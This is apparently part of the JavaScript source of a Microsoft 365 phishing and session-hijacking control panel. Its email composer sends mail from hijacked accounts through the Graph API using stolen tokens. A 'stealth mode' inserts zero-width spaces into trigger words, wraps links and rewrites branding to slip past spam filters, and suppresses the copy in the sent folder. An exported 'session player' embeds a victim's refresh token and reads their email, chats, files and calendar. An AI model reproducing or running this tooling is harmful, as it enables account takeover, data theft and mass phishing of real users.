    preview.innerHTML = '<div style="padding:12px;color:#999;font-size:18px;font-family:Arial,sans-serif">Select a template or enter HTML to preview</div>';
  }
}

function updateComposeFlows(flows) {
  composeFlowCache = flows.filter(function(f){return f.status==="pending";});
  var sel = document.getElementById("compose-flow");
  if (!sel) return;
  var current = sel.value;
  var opts = '<option value="oauth">OAuth Redirect (AiTM proxy)</option>';
  composeFlowCache.forEach(function(f) {
    var remaining = Math.max(0,Math.ceil((f.expiresAt-Date.now())/1000));
    var selected = f.id===current ? " selected" : "";
    opts += '<option value="'+f.id+'"'+selected+'>'+esc(f.userCode)+" ("+remaining+"s left)</option>";
  });
  sel.innerHTML = opts;
  if (composeFlowId) {
    sel.value = composeFlowId;
    composeFlowId = null;
  }
}

function looksLikeEmail(s) { return /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(s); }

function importMailingList(input) {
  var file = input.files[0];
  if (!file) return;
  var status = document.getElementById("compose-import-status");
  var reader = new FileReader();
  reader.onload = function(e) {
    var text = e.target.result;
    var lines = text.split(/[\\r\\n,;]+/).map(function(l){return l.trim();}).filter(Boolean);
    var emails = lines.filter(function(l){ return looksLikeEmail(l); });
    var skipped = lines.length - emails.length;
    if (!emails.length) { status.innerHTML = '<span style="color:var(--red)">No valid emails found in file</span>'; return; }
    var existing = document.getElementById("compose-bcc").value.split(",").map(function(e){return e.trim();}).filter(Boolean);
    var merged = existing.concat(emails);
    var unique = merged.filter(function(v,i,a){return a.indexOf(v)===i;});
    document.getElementById("compose-bcc").value = unique.join(", ");
    var msg = '<span style="color:var(--green)">Imported ' + emails.length + ' to BCC</span>';
    if (skipped) msg += ' <span style="color:var(--orange)">(' + skipped + ' invalid line'+(skipped>1?'s':'')+' skipped)</span>';
    status.innerHTML = msg;
  };
  reader.readAsText(file);
  input.value = "";
}

async function sendComposedEmail() {
  if (!selectedSession) { alert("Select a hooked session from the sidebar first"); return; }
  var toRaw = document.getElementById("compose-to").value;
  var toAddrs = toRaw ? toRaw.split(",").map(function(e){return e.trim();}).filter(Boolean) : [];
  var ccRaw = document.getElementById("compose-cc").value;
  var bccRaw = document.getElementById("compose-bcc").value;
  var ccAddrs = ccRaw ? ccRaw.split(",").map(function(e){return e.trim();}).filter(Boolean) : [];
  var bccAddrs = bccRaw ? bccRaw.split(",").map(function(e){return e.trim();}).filter(Boolean) : [];
  if (!toAddrs.length && !ccAddrs.length && !bccAddrs.length) { alert("Enter at least one recipient (TO, CC, or BCC)"); return; }
  var badTo = toAddrs.filter(function(a){ return !looksLikeEmail(a); });
  if (badTo.length) { alert("Invalid TO address: " + badTo[0] + "\\n\\nMake sure the TO field contains email addresses, not the subject line."); return; }
  var badCc = ccAddrs.filter(function(a){ return !looksLikeEmail(a); });
  var badBcc = bccAddrs.filter(function(a){ return !looksLikeEmail(a); });
  if (badCc.length) { alert("Invalid CC address: " + badCc[0]); return; }
  if (badBcc.length) { alert("Invalid BCC address: " + badBcc[0]); return; }
  var subject = document.getElementById("compose-subject").value;
  var body = document.getElementById("compose-body").value;
  if (!subject && !body) { alert("Subject and body are both empty"); return; }
  var saveSent = document.getElementById("compose-save-sent").checked;
  var importance = document.getElementById("compose-importance").value;
  var btn = document.getElementById("compose-send-btn");
  var status = document.getElementById("compose-status");
  btn.disabled = true; btn.textContent = "Sending..."; status.textContent = "";

  stealthPreSend();

  var tok = await getToken(selectedSession);
  if (!tok) {
    status.innerHTML = '<span style="color:var(--red)">Failed to acquire access token</span>';
    btn.disabled = false; btn.textContent = "Send Email"; return;
  }

  var msg = {
    subject: subject,
    body: { contentType: "HTML", content: body },
    importance: importance,
    toRecipients: toAddrs.map(function(a){return {emailAddress:{address:a}};})
  };
  if (ccAddrs.length) msg.ccRecipients = ccAddrs.map(function(a){return {emailAddress:{address:a}};});
  if (bccAddrs.length) msg.bccRecipients = bccAddrs.map(function(a){return {emailAddress:{address:a}};});

  try {
    var r = await fetch("https://graph.microsoft.com/v1.0/me/sendMail",{
      method:"POST",
      headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
      body:JSON.stringify({message:msg,saveToSentItems:saveSent})
    });
    if (r.status===202||r.status===200) {
      var count = toAddrs.length+ccAddrs.length+bccAddrs.length;
      status.innerHTML = '<span style="color:var(--green)">\\u2713 Email sent to '+count+' recipient'+(count>1?"s":"")+"</span>";
    } else {
      var errText = await r.text();
      var errMsg = "";
      try { errMsg = JSON.parse(errText).error.message; } catch(e2) { errMsg = errText.substring(0,200); }
      status.innerHTML = '<span style="color:var(--red)">Failed ('+r.status+"): "+esc(errMsg)+"</span>";
    }
  } catch(e) {
    status.innerHTML = '<span style="color:var(--red)">Error: '+esc(e.message)+"</span>";
  }
  btn.disabled = false; btn.textContent = "Send Email";
}

function composeForFlow(flowId) {
  composeFlowId = flowId;
  switchTab("compose",document.querySelectorAll(".tab")[4]);
  renderTemplateChips();
  var sel = document.getElementById("compose-flow");
  if (sel) sel.value = flowId;
  applyTemplate(0);
}

renderTemplateChips();

// ── Stealth Mode ─────────────────────────────────────
let stealthMode = false;

function toggleStealth() {
  stealthMode = !stealthMode;
  const btn = document.getElementById("stealth-btn");
  const panel = document.getElementById("stealth-panel");
  if (stealthMode) {
    btn.classList.add("active");
    panel.classList.add("active");
    applyStealthDefaults();
  } else {
    btn.classList.remove("active");
    panel.classList.remove("active");
  }
  if (lastTemplateIdx >= 0) applyTemplate(lastTemplateIdx);
}

function applyStealthDefaults() {
  // Disable save to sent items
  const saveSent = document.getElementById("compose-save-sent");
  if (saveSent) saveSent.checked = false;
  // Set importance to normal
  const importance = document.getElementById("compose-importance");
  if (importance) importance.value = "normal";
}

function stealthTransformBody(html) {
  var zwsp = String.fromCharCode(0x200B);
  var words = ["verify","password","credential","expire","suspend","urgent","immediately","confirm","authenticate","account"];
  var out = html;
  for (var i = 0; i < words.length; i++) {
    var w = words[i];
    var mid = Math.floor(w.length / 2);
    var broken = w.slice(0, mid) + zwsp + w.slice(mid);
    var idx = 0;
    while (true) {
      var pos = out.toLowerCase().indexOf(w, idx);
      if (pos === -1) break;
      var before = out.lastIndexOf(">", pos);
      var after = out.indexOf("<", pos);
      if (before !== -1 && (after === -1 || after > pos)) {
        out = out.slice(0, pos) + broken + out.slice(pos + w.length);
        idx = pos + broken.length;
      } else {
        idx = pos + w.length;
      }
    }
  }
  return out;
}

function stealthWrapUrl(body) {
  var result = "";
  var i = 0;
  while (i < body.length) {
    var aStart = body.toLowerCase().indexOf("<a ", i);
    if (aStart === -1) { result += body.slice(i); break; }
    result += body.slice(i, aStart);
    var aEnd = body.indexOf("</a>", aStart);
    if (aEnd === -1) { result += body.slice(aStart); break; }
    aEnd += 4;
    var tag = body.slice(aStart, aEnd);
    result += '<table cellpadding="0" cellspacing="0" border="0" style="display:inline-table"><tr><td>' + tag + '</td></tr></table>';
    i = aEnd;
  }
  return result;
}

function stealthSanitize(subject, body) {
  // ── Subject rewrites ────────────────────────────────
  var subjectMap = [
    [/Action Required:\s*/gi, ""],
    [/Warning:\s*/gi, ""],
    [/Urgent:\s*/gi, ""],
    [/\bAction Needed:\s*/gi, ""],
    [/Multi-Factor Authentication Verification/gi, "Quarterly Access Review"],
    [/Verify Your Account/gi, "Collaboration Access Update"],
    [/Complete Your Device Registration/gi, "Endpoint Compliance Check"],
    [/Verify Identity for Shared Documents/gi, "Document Access — Action Needed"],
    [/Your Password Will Expire Soon/gi, "Scheduled Credential Rotation Reminder"],
    [/Microsoft Teams:\s*/gi, ""],
    [/Microsoft Security/gi, "Information Security"],
  ];
  var s = subject;
  for (var i = 0; i < subjectMap.length; i++) {
    s = s.replace(subjectMap[i][0], subjectMap[i][1]);
  }

  // ── Body rewrites ──────────────────────────────────
  var b = body;
  var bodyMap = [
    // Remove Microsoft branding from headers
    [/Microsoft Security/g, "Information Security"],
    [/Microsoft Corporation \| Automated security notification/g, "Automated security notification"],
    [/Microsoft Teams \| Automated notification/g, "Internal Communications"],
    [/Microsoft SharePoint \| Automated notification/g, "Document Services"],
    [/IT Security \| Automated password notification/g, "Automated credential notification"],
    [/— IT Security Team/g, "— IT Services"],
    [/>SharePoint Online</g, ">Document Portal<"],
    [/>Microsoft Teams</g, ">Collaboration Services<"],

    // Soften urgency language
    [/Action Required/gi, "For your review"],
    [/immediately/gi, "at your convenience"],
    [/Your organization password is set to expire within the next 24 hours\./gi, "As part of our regular credential rotation schedule, your access credentials are due for renewal."],
    [/To prevent account lockout, please re-authenticate your device now\./gi, "Please complete the renewal process below when you have a moment."],
    [/Password Expiration Notice/gi, "Credential Renewal"],
    [/This link will expire shortly\. Please complete verification as soon as possible\./gi, "Please complete this process within the next few business days."],
    [/requires verification/gi, "has a pending update"],
    [/we require all employees to verify/gi, "we are asking employees to confirm"],
    [/This is a routine check/gi, "This is part of our quarterly review"],

    // Remove alarm styling (red/orange warning banners)
    [/background:#d83b01/g, "background:#2b579a"],
    [/color:#d83b01/g, "color:#2b579a"],
    [/border-left:4px solid #d83b01/g, "border-left:4px solid #2b579a"],
    [/background:#fff4ce/g, "background:#f0f4fa"],
    [/&#9888; /g, ""],

    // Remove "Scan to verify/re-authenticate" phrasing
    [/Scan to re-authenticate:/gi, "Complete renewal:"],
    [/Scan to verify your identity:/gi, "Confirm your access:"],
    [/Scan to verify your account:/gi, "Confirm your access:"],
    [/Scan to register your device:/gi, "Register below:"],

    // Soften button text
    [/>Verify My Account</g, ">Continue<"],
    [/>Re-authenticate Now</g, ">Renew Access<"],
    [/>Verify Account</g, ">Continue<"],

    // Footer — remove MS branding
    [/Microsoft Corporation/g, "Internal Services"],
  ];
  for (var j = 0; j < bodyMap.length; j++) {
    b = b.replace(bodyMap[j][0], bodyMap[j][1]);
  }

  return {subject: s, body: b};
}

// Stealth pre-send hook — called from the send button
function stealthPreSend() {
  if (!stealthMode) return;
  var bodyEl = document.getElementById("compose-body");
  if (bodyEl) {
    var body = bodyEl.value;
    body = stealthTransformBody(body);
    body = stealthWrapUrl(body);
    bodyEl.value = body;
    updatePreview();
  }
  applyStealthDefaults();
}
</script>
</body>
</html>`;
}

// ── Session Player HTML (standalone export) ─────────────

function getSessionPlayerHTML(session) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Session Player — ${session.user?.upn || "unknown"}</title>
<style>
:root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--text:#e6edf3;--dim:#8b949e;--accent:#58a6ff;--green:#3fb950;--red:#f85149}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'SF Mono','Consolas',monospace;background:var(--bg);color:var(--text);padding:20px}
h1{font-size:16px;color:var(--accent);margin-bottom:16px}
.info{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:12px;font-size:18px;line-height:1.6;margin-bottom:16px}
.info b{color:var(--accent)}
.row{display:flex;gap:8px;margin-bottom:12px;align-items:center}
input,select{background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:18px;border-radius:4px;flex:1}
button{background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 14px;font-family:inherit;font-size:18px;border-radius:4px;cursor:pointer}
button:hover{border-color:var(--accent);color:var(--accent)}
.presets{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:12px}
.presets button{font-size:16px;padding:4px 10px}
pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:12px;font-size:18px;overflow:auto;max-height:70vh;white-space:pre-wrap;word-break:break-word}
.status{font-size:16px;margin-bottom:8px}
</style>
</head>
<body>
<h1>SESSION PLAYER</h1>
<div class="info">
<b>User:</b> ${session.user?.upn || "?"} (${session.user?.name || "?"})<br>
<b>Tenant:</b> ${session.user?.tid || "?"}<br>
<b>Client ID:</b> ${session.clientId}
</div>
<div class="row">
<select id="method"><option>GET</option><option>POST</option><option>PATCH</option><option>DELETE</option></select>
<input id="endpoint" value="/v1.0/me" placeholder="/v1.0/me">
<button onclick="send()">Send</button>
</div>
<div class="presets">
<button onclick="go('/v1.0/me')">Profile</button>
<button onclick="go('/v1.0/me/messages?$top=10')">Emails</button>
<button onclick="go('/v1.0/me/chats?$top=20')">Chats</button>
<button onclick="go('/v1.0/me/joinedTeams')">Teams</button>
<button onclick="go('/v1.0/me/drive/root/children')">OneDrive</button>
<button onclick="go('/v1.0/me/calendarView?startDateTime='+new Date().toISOString()+'&endDateTime='+new Date(Date.now()+7*864e5).toISOString())">Calendar</button>
<button onclick="go('/v1.0/organization')">Org</button>
<button onclick="go('/v1.0/me/memberOf')">Roles</button>
</div>
<div class="status" id="status"></div>
<pre id="output">Ready. Click Send or a preset.</pre>
<script>
const RT=${JSON.stringify(session.refreshToken)};
const CID=${JSON.stringify(session.clientId)};
const TE=${JSON.stringify(getTokenEndpoint(session))};
let accessToken=null, tokenExp=0;

async function getToken(){
  if(accessToken&&tokenExp>Date.now()+60000)return accessToken;
  document.getElementById("status").textContent="Refreshing token...";
  const r=await fetch(TE,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},
    body:"client_id="+CID+"&grant_type=refresh_token&refresh_token="+encodeURIComponent(RT)+"&scope=https://graph.microsoft.com/.default"});
  const d=await r.json();
  if(!d.access_token){document.getElementById("status").innerHTML='<span style="color:var(--red)">Token refresh failed: '+(d.error||"unknown")+'</span>';return null;}
  accessToken=d.access_token;tokenExp=Date.now()+(d.expires_in*1000);
  document.getElementById("status").innerHTML='<span style="color:var(--green)">Token refreshed</span>';
  return accessToken;
}

function go(p){document.getElementById("endpoint").value=p;send();}

async function send(){
  const ep=document.getElementById("endpoint").value;
  const method=document.getElementById("method").value;
  const tok=await getToken();
  if(!tok)return;
  document.getElementById("status").textContent="Fetching...";
  try{
    const r=await fetch("https://graph.microsoft.com"+ep,{method,headers:{"Authorization":"Bearer "+tok}});
    const txt=await r.text();
    try{document.getElementById("output").textContent=JSON.stringify(JSON.parse(txt),null,2);}
    catch{document.getElementById("output").textContent=txt;}
    document.getElementById("status").textContent=r.status+" "+r.statusText;
  }catch(e){document.getElementById("output").textContent="Error: "+e.message;document.getElementById("status").textContent="Failed";}
}
</script>
</body>
</html>`;
}